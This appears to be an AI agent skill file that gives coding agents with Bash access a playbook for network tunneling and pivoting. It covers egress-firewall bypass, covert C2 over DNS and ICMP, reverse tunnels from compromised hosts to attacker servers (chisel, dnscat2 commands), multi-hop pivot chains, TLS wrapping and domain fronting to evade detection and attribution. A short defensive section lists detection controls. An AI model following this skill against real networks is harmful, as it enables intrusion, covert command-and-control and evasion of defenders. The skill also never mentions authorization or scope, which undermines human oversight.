---
name: network-tunneling-proxy
description: "Network tunneling encapsulates one protocol inside another to bypass firewalls, evade detection, and route traffic through restricted networks."
origin: openclaw
version: "0.1.19"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: network-attack
  tool_count: 0
  guide_count: 3
  mitre: "TA0008-Lateral Movement"
---

# Network Tunneling & Proxy

> **Supplementary Files**:
> - `payloads.md` -- Tunneling and proxy payloads: HTTP/SOCKS tunnels, SSH pivoting, DNS/ICMP covert channels, TLS wrapping, proxy chaining, multi-hop pivot construction
> - `test-cases.md` -- Structured test cases covering SOCKS proxy setup, HTTP tunnels, DNS tunnels, SSH pivoting, proxy chains, ICMP tunnels, and TLS wrapping
> - `guides/ssh-http-tunneling-pivoting.md` -- Deep dive into SSH and HTTP tunneling with pivoting techniques
> - `guides/dns-icmp-covert-tunnel.md` -- DNS and ICMP covert channel construction and detection
> - `guides/socks-proxy-chain-traffic.md` -- SOCKS proxy chaining, TLS wrapping, and traffic masking

## Summary

Network Tunneling Proxy skill domain covering network attack operations.

**Domain**: network-attack

**MITRE ATT&CK**: TA0008-Lateral Movement

## Description

Network tunneling encapsulates one protocol inside another to bypass firewalls, evade detection, and route traffic through restricted networks. Proxying intermediates network connections to mask origins, chain through multiple hosts, and distribute traffic across disparate exit points. Together, these techniques enable penetration testers to reach isolated network segments, maintain persistent covert channels, and simulate advanced adversary lateral movement.

**Core Insight**: Most enterprise networks restrict inbound connections but allow outbound traffic on specific protocols (HTTP/HTTPS, DNS, ICMP). Tunneling exploits these asymmetric rules by encapsulating arbitrary traffic inside permitted protocols. Defense teams that only monitor Layer 7 HTTP content will miss tunnels operating at Layer 3-4 via DNS queries, ICMP packets, or raw TCP relays.

**Key Tunnel Types**:

- **HTTP/SOCKS Tunnels**: chisel, gost, 3proxy encapsulate traffic in HTTP or SOCKS protocol, blending with normal web traffic
- **SSH Tunneling**: sshuttle provides VPN-like transparent access; SSH port forwarding for targeted relay
- **DNS Tunneling**: dnscat2 creates bidirectional C2 channels over DNS queries -- see `dns-attacks` skill for dns2tcp and iodine variants
- **ICMP Tunneling**: ptunnel encapsulates TCP inside ICMP echo packets, exploiting permissive ping rules
- **TLS Wrapping**: stunnel adds TLS encryption to any TCP connection, hiding protocol fingerprints
- **Pivoting**: ligolo-ng enables multi-hop relay chains through compromised hosts for deep network traversal

**Cross-References**:
- `dns-attacks` -- dns2tcp, iodine, dnscat2 for DNS protocol attacks and exfiltration; this skill focuses on the tunneling/proxying use case
- `post-exploitation` -- chisel and ligolo-ng for pivoting during lateral movement; this skill provides the full tunneling toolkit context
- `network-pentest` -- general network reconnaissance and attack; tunneling extends reach into discovered segments

---

## Use Cases

1. **Bypassing egress firewall restrictions** -- Encapsulate traffic in permitted outbound protocols (DNS, ICMP, HTTPS) to reach external C2 infrastructure from restricted networks
2. **Pivoting through compromised hosts** -- Chain SOCKS proxies and tunnels through multiple pivot points to reach isolated internal network segments (e.g., DMZ to production to database tier)
3. **Maintaining covert C2 channels** -- Establish DNS or ICMP-based tunnels that evade HTTP content inspection and standard proxy logging
4. **Transparent network access via VPN-like tunnels** -- Use sshuttle or chisel SOCKS tunnels to route entire subnet traffic through a single compromised host without per-service configuration
5. **Traffic masking and obfuscation** -- Wrap tunnels in TLS with stunnel, chain through multiple proxy types, and distribute traffic to defeat traffic analysis and attribution
6. **Red team infrastructure relay** -- Build multi-hop tunnel chains from target network back through redirectors to operator workstations, mimicking advanced adversary infrastructure

---

## Core Tools

| Tool | Category | Purpose | Key Command |
|------|----------|---------|-------------|
| chisel | HTTP/SOCKS Tunnel | TCP/UDP tunnel over HTTP with SOCKS5 support, NAT traversal | `chisel server -p 8080 --reverse` |
| ligolo-ng | Pivoting | Transparent proxy with TUN interface for multi-hop pivoting | `./proxy -selfcert` |
| proxychains | Proxy Chaining | Route any application traffic through SOCKS/HTTP proxy chains | `proxychains4 nmap -sT target` |
| socat | Relay/Tunnel | Bidirectional byte stream relay between any two endpoints | `socat TCP-LISTEN:8080,fork TCP:target:80` |
| ptunnel | ICMP Tunnel | Reliable TCP tunnel over ICMP echo packets | `sudo ptunnel` |
| gost | Multi-protocol Tunnel | Tunnel over HTTP/HTTPS/SOCKS5/Shadowsocks/QUIC with chaining | `gost -L :8080 -F socks5://proxy:1080` |
| 3proxy | Proxy Server | Lightweight HTTP/SOCKS proxy with chaining and ACL support | `3proxy /etc/3proxy/3proxy.cfg` |
| sshuttle | SSH VPN | Transparent VPN-like network access over SSH without root on remote | `sshuttle -r user@host 10.0.0.0/8` |
| stunnel | TLS Wrapping | Add TLS encryption to any TCP service, hiding protocol fingerprints | `stunnel /etc/stunnel/stunnel.conf` |
| dnscat2 | DNS C2 Tunnel | Encrypted C2 channel over DNS with file transfer and shell | `ruby ./dnscat2.rb domain.com` |

---

## Methodology

### Phase 1: Network Topology Assessment

Before tunneling, map the network restrictions:

```
1. Identify allowed outbound protocols (nmap, curl, nslookup tests)
2. Determine firewall rules (inbound/outbound filtering)
3. Locate proxy infrastructure (corporate proxies, web gateways)
4. Assess DNS resolution policy (external resolvers allowed?)
5. Check ICMP egress (ping external hosts)
6. Map internal network segments reachable from current position
```

### Phase 2: Tunnel Type Selection

Select tunnel type based on network restrictions:

| Network Restriction | Recommended Tunnel | Fallback |
|---------------------|-------------------|----------|
| Outbound HTTP/HTTPS allowed | chisel (HTTP tunnel) | gost |
| Outbound DNS allowed | dnscat2 | iodine (see dns-attacks) |
| Outbound ICMP allowed | ptunnel | ICMP shell |
| SSH access to pivot host | sshuttle | SSH port forwarding |
| No outbound, but have pivot | ligolo-ng (reverse) | chisel --reverse |
| Need to mask protocol | stunnel + any tunnel | gost with TLS |
| Deep inspection in place | DNS tunnel + stunnel | Multi-hop chain |

### Phase 3: Tunnel Construction

Build tunnels in order of stealth:

1. **SSH-based** (sshuttle, port forward) -- legitimate traffic pattern, but requires SSH access
2. **HTTP/SOCKS** (chisel, gost, 3proxy) -- blends with web traffic, survives most proxies
3. **TLS-wrapped** (stunnel) -- encrypted outer layer defeats DPI
4. **DNS** (dnscat2) -- last resort when only DNS is allowed, high latency
5. **ICMP** (ptunnel) -- when only ping is allowed, very slow but functional

### Phase 4: Pivoting Chain Construction

For deep network traversal:

```
Operator -> [stunnel TLS] -> [proxy1: SOCKS5] -> [chisel HTTP] -> [pivot1] -> [ligolo-ng TUN] -> [pivot2] -> Target Network
```

Chain multiple tunnel types to maximize stealth:

- Outer layer: stunnel TLS wrapping (hide protocol fingerprints)
- Middle layer: chisel or gost HTTP tunnel (blend with web traffic)
- Inner layer: SOCKS proxy via proxychains (route arbitrary applications)
- Final hop: ligolo-ng TUN interface (transparent Layer 3 access)

### Phase 5: Traffic Verification

Confirm tunnel functionality and stealth:

```
1. Verify connectivity through tunnel (curl, nmap through proxychains)
2. Check tunnel throughput (iperf3 through tunnel)
3. Verify tunnel persistence (reconnection on failure)
4. Monitor for detection signs (IDS alerts, firewall logs)
5. Document tunnel chain for engagement reporting
```

---

## Defense Perspective

**Detection Strategies**:

- **DNS tunnel detection**: Monitor for abnormally long subdomain labels (>60 chars), high query frequency, unusual query types (TXT, NULL), and consistent query patterns from single hosts
- **ICMP tunnel detection**: Flag ICMP packets with unusually large payloads, non-standard payload content, or consistent ICMP traffic to a single destination
- **HTTP tunnel detection**: Look for unusual HTTP headers, binary data in HTTP bodies, long-lived connections with high throughput, and connections to unusual ports serving HTTP
- **SOCKS proxy detection**: Monitor for SOCKS handshake patterns (0x05 byte), unexpected outbound connection patterns from single hosts
- **TLS anomaly detection**: Identify TLS connections to uncommon ports, self-signed certificates, and certificate mismatches between SNI and presented cert

**Prevention Controls**:

- Implement strict egress filtering with allow-lists for outbound protocols and destinations
- Deploy DNS inspection and filtering (block TXT/NULL queries, limit query length)
- Rate-limit ICMP traffic and block large ICMP payloads
- Use deep packet inspection (DPI) for HTTP/HTTPS traffic
- Monitor for TUN/TAP interface creation on endpoints
- Deploy network behavior analysis (NBA) tools for anomalous traffic patterns

**Logging and Monitoring**:

- Log all DNS queries with full query string for retrospective tunnel detection
- Monitor outbound connection volume and duration per host
- Alert on sudden increases in DNS or ICMP traffic from individual hosts
- Track proxy and tunnel process creation on endpoints (OS-level monitoring)
- Correlate network flow data with endpoint process information

---

## Practical Steps

1. **Assess network egress** — From the current network position, identify which outbound protocols are permitted. Test HTTP/HTTPS (curl to external server), DNS (nslookup external domain), ICMP (ping external host), and arbitrary TCP ports (nc -zv). Record all allowed protocols for tunnel type selection.
2. **Select tunnel type** — Based on egress assessment, choose the most stealthy tunnel that will work: SSH tunnel if SSH access exists, HTTP/SOCKS tunnel if outbound web traffic is allowed, DNS tunnel if only DNS resolves, ICMP tunnel if only ping works. Prefer tunnels that blend with existing traffic patterns.
3. **Deploy tunnel server** — On the attacker-controlled infrastructure (VPS or local listener), start the appropriate tunnel server: chisel server, dnscat2 server, ptunnel relay, or stunnel TLS endpoint. Configure authentication and logging.
4. **Deploy tunnel client** — On the compromised pivot host, deploy and execute the tunnel client connecting back to the server. For chisel, use `chisel client http://server:port R:socks`. For dnscat2, execute `./dnscat --secret KEY domain.com`. Verify the connection establishes in the server logs.
5. **Configure proxy routing** — Set up proxychains or application-level proxy configuration to route tools through the newly created tunnel. Create `/etc/proxychains4.conf` with the SOCKS port from the tunnel client. Test with `proxychains4 curl http://internal-target`.
6. **Build pivot chain** — For deep network traversal requiring multiple hops, chain tunnels: establish first tunnel to DMZ host, deploy and connect second tunnel through the first, route target subnet through the final tunnel interface. Document each hop with IP, port, tunnel type, and credentials.
7. **Wrap in TLS for stealth** — If deep packet inspection is detected, wrap the tunnel connection in stunnel TLS. Configure stunnel server on the tunnel endpoint and stunnel client on the pivot host. This hides the tunnel protocol inside standard HTTPS traffic.
8. **Verify tunnel functionality** — Test connectivity through the tunnel with multiple tools (nmap, curl, ssh). Measure throughput with iperf3. Check for DNS leaks by monitoring DNS queries. Verify the tunnel survives idle periods and reconnects automatically.
9. **Monitor for detection** — Watch for indicators that the tunnel has been detected: IDS alerts, firewall blocks, unusual process termination on the pivot host. Have fallback tunnel types ready to switch to if the primary tunnel is blocked.
10. **Document and plan cleanup** — Record the complete tunnel chain configuration for engagement reporting. Prepare cleanup commands for each tunnel component (kill processes, remove TUN interfaces, delete configuration files). Execute cleanup during the engagement closeout phase.

## Common Pitfalls

1. **Tunnel without encryption** -- Unencrypted tunnels (plain HTTP, raw TCP relay) expose data to interception. Always wrap tunnels in TLS using stunnel or SSH.
2. **Single point of failure** -- A tunnel chain with a single pivot point fails if that host goes down. Build redundant paths where possible.
3. **Ignoring MTU and latency** -- DNS and ICMP tunnels have high overhead and low MTU. File transfers and interactive shells will be slow -- plan accordingly.
4. **Tunnel detection via traffic volume** -- Even encrypted tunnels create traffic volume anomalies. Use traffic throttling and scheduling to blend with normal patterns.
5. **Hardcoded tunnel endpoints** -- Embedding server IPs in tunnel configurations creates artifacts. Use domain fronts or dynamic DNS for flexibility.
6. **Neglecting cleanup** -- TUN interfaces, proxy processes, and socat relays leave traces on compromised hosts. Plan cleanup procedures for each tunnel component.
7. **Port collision on pivot hosts** -- Running multiple tunnels on the same pivot host risks port conflicts and resource exhaustion. Monitor pivot host resources.
8. **DNS tunnel without domain control** -- dnscat2 and iodine require authoritative DNS delegation for a domain. Attempting DNS tunneling without this setup will fail at the nameserver level.
